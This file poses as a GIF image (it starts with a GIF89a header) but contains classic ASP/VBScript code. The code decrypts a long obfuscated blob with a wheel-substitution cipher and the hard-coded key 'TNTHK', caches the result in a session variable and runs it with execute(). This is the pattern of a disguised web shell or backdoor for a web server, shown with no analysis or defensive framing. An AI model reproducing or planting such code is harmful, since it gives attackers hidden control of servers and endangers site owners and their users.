GIF89a<%
Public Const sDefaultWHEEL1 = ">/ShR'b=V cCF.95WHU3Ei-4);aI6A""+10dj(P,2geNkfxm<ywJ#zqBT&oKLQ!pn7uv_l8:rts" 
Public Const sDefaultWHEEL2 = ": uN4dB>CzHvaE2SI0jph""+(=k.xsPL,rKQwb;qTnt6ge&J<#li'-7/oAWFc58fU1V)!3_m9yR" 

Function Decrypt_PRO(sINPUT , sPASSWORD ) 
Dim sWHEEL1, sWHEEL2 
Dim k, i, c 
Dim sRESULT 
sWHEEL1 = sDefaultWHEEL1: sWHEEL2 = sDefaultWHEEL2 
ScrambleWheels sWHEEL1, sWHEEL2, sPASSWORD 
sRESULT = "" 
For i = 1 To Len(sINPUT) 
c = mid(sINPUT, i, 1)
k = InStr(1, sWHEEL2, c, vbBinaryCompare) 
If k > 0 Then 
sRESULT = sRESULT & mid(sWHEEL1, k, 1) 
Else 
sRESULT = sRESULT & Addpass(c,sPASSWORD) 
End If 
sWHEEL1 = LeftShift(sWHEEL1): sWHEEL2 = RightShift(sWHEEL2) 
Next 
Decrypt_PRO = sRESULT 
End Function 

Function LeftShift(s ) 
If Len(s) > 0 Then LeftShift = mid(s, 2, Len(s) - 1) & mid(s, 1, 1)
End Function 

Function RightShift(s ) 
If Len(s) > 0 Then RightShift = mid(s, Len(s), 1) & mid(s, 1, Len(s) - 1)
End Function 

Sub ScrambleWheels(ByRef sW1 , ByRef sW2 , sPASSWORD ) 
Dim i ,k 
For i = 1 To Len(sPASSWORD) 
For k = 1 To ascW(mid(sPASSWORD, i, 1)) * i 
sW1 = LeftShift(sW1): sW2 = RightShift(sW2)

Next 
Next 
End Sub 

Function Addpass(tStr,tPass) 
Select Case tStr 
Case ChrW(13) 
Addpass = tStr 
Case ChrW(10) 
Addpass = tStr 
Case ChrW(13)+ChrW(10) 
Addpass = tStr 
Case ChrW(9) 
Addpass = tStr 
Case Else
dim a
a= mid(tstr,1,1)
Addpass = ChrW((ascW(tPass) Xor Len(tPass)) Xor ascW(tstr))
End Select
End Function 

Dim crypt_PRO,Key,Code
crypt_PRO="k#BJc&E(K>;QmfK/b!U0#n����eP-EhRT!At=.4ft��mlSgr0:<ggfvm>tBixk(0s>< v;=_!t<ch��:F;cWo7'<<n v""_k+w+cEB7>Ir (.41wV.j4ftHu�� I7J>0x ,s1Aa9/#n""LzlN)'Q>7V 3PTl(7ia4Qpumfg1w ,-QVix207R0C& Rp7WshQ.-('C:o1gz;.v3��Wyw.Up0;9 Jq-emt_.jT1Bck76xHWx<zP��&gc:;LV vcSak+VNiqL5&s+2w52aUK7Sw��'l<&8uTr!NE802x=!d-nrf<L=I9Bck76xHWx<zP��&gtT;w.Up0;9 Jq-emt_.jRC8xoePa��Wo7'l<n ,jvS(UK+W#K>lIuvjuo�� R9_4i7p��	o#zT.p(,9t6""gjcJ82hdx):zW+Wro2.kUL46:#/T8.QQF=_(+Fkߢ��������F���ԱF򄋿���딍�k����84N7_&6k;alnFn9fJ/egUS2hdx)::s��N R9B<IUdh��o7fQ;N��tT;wsqx#UaKCu<4w_�ցO�J�����ցO�V�x7#_eqzn3��gtT;LnP=Qkm""noI&VyT!NVfb/kUc+K;e)t8INL1_I9P+!=E2cIdB'C9yg9URyg-T'cx>d/-3)&z71.P,xcKlpaW2N4lBygql75_3T#w<ogvun9,�ցO�J���ށV�P4u�J��kb ;""1;pN�}�J��d(S3H_f50gH""krrNPr=-��xk(""2=ECjz/d=TQ&WLVBf#_PKl&3&It#rvK4P#""(F'Bz8b>NF'Vf!52��U8cWi5le/&It5 r=cJ0SU_>6��'NBygSo-7F!&B=0o'r0:g&rBj_KPHJ0SU_>6vE ""i; 9+NV!o-.eS7la(xQA,'B!h,-W4c;IVNqg93dnK77_Iek8l,nVu&q)��tT;wsqx+r(3pqf!CR5""tE7i'AV-.qS7lt,eCoLw;jiIvc(p9!#x!>z9365,_V1T'a0&6uLv<w0.'fw aQr&QewEB'Neo!n);VW!);JK&7""r/-V/1TN<Fh(k""7xgEB'JW83NVfb/kU1we,gnT>y8Q���ɣ�ڦ������p�Qؽ�����VϜ�f���Ȅu�ۖ������,W=wTJJ0#;qz;PTqzjd0k!4.=;.bvlpL)_9!kRSc-(lAv,qdKQf��;wK,=cSu_R><0j9p3w 34��!VU8/17:y��<&/""1;73��PxhovyV_NgEjcs��H'h!z=����,w7z;wp,tx_kS38xdoWC��U# Wd.!u8z#ANgjUj!qzTawrRuvrcULIJ��v'BS# Wd_wUAPW9)'puJEx# dJr3Eyk>J��B6aS0d<W!t93L+-2F8a4��9jor3qtzQf5;=xUz��inHbSN&oVT_)sh+aLCHu��<E6':1C5T:xz;r0c6a7Cl'uJ"");L/I5U+/'g0y��43a1lzP'.!KAJI6��K/0< R>,d)_,'��f(7nK;&voSwWrRTFRL+!fRNHp>4-mtdB'5<cAo(2Ni��Π�����kzwuE0==_""=Ie��'ud&��4T_Al78x9,'R#So:SJqz4Sp.w(h3aW""+!uU y9TLp)�츰<,W=wTJJ0gJq)��Rpfw&)��cEvkhu<LR��Tcs vr��jC.4UFnxt>��w LTf-m#x>RaS,9J�� tmdqlU_lt/WRT2��#zT.p(,9t ""gjckecCP4yg:,V�ցO�J�����ցO�V�(leVnQdb1��Q_kadz0Wx8>P4&vL&n'Ub9a3/ wTo'l'adQ;S1w2>""jjJ��I'>38VRTzgUv5x!ax+K;e7tqaL Tnvh>pIy rrwC����ֺ��3dt!Q&lAAxRTb;6'qa= Ts_9+,zefopyQ4>vRp#wREI52��FplbPKt>'v,7s_w/_.SI8A!94E yJ1wR:&/t7irw))_6��_ֺ��sT x3dzII8A!94E yJ1wR:&/t7il0C9ey��6NKhE0kVw_S;a7p>< 3t_znj-iaAcIl0x;vtq'w P+_(I#0T6hB'>6Q H_0A1W'aL(Hu:��ivts""kKRgN(&h8xJ8E/V_uu<4!3+��)xWe;tlScpT8bNgf5��LV""C dE7(WNk:t>.t1,KFH7""4c;yIz<yfBFTqzj""xKo(z!WdvI:&9)Kw5ao(B-B��ivts""kKRgN(&h8xJ8j>C7ub:s��yKUig<o""Vk&!6zl3zo""jp=Kh3BW""v 2-k:z1+fW,_����AUkh,w6'TbHsR;qzjd02mRLLKB;9�ցO�J��>jWpNJp c�}�J��8d9i)'e6w������J��I'>38VRTzgUv5x!ax7h,w66m��n ,jvS(UK!EwH'0b'Neo!n)h��Wko6wT<EW0;cQ t5 xLd/)I8EEB-yu<Ru'.qfKcc-=e#u QJlKpu8FAo2.PERAtqb��"
key="TNTHK"
if Session("EXBkHKFSg")="" then
crypt_PRO=replace(crypt_PRO,"��",Chr(37)&">")
code=Decrypt_PRO(crypt_PRO,Key)
code=replace(code,"��",vbCrLf)
Session("EXBkHKFSg")=code
end if
execute(Session("EXBkHKFSg"))

%>
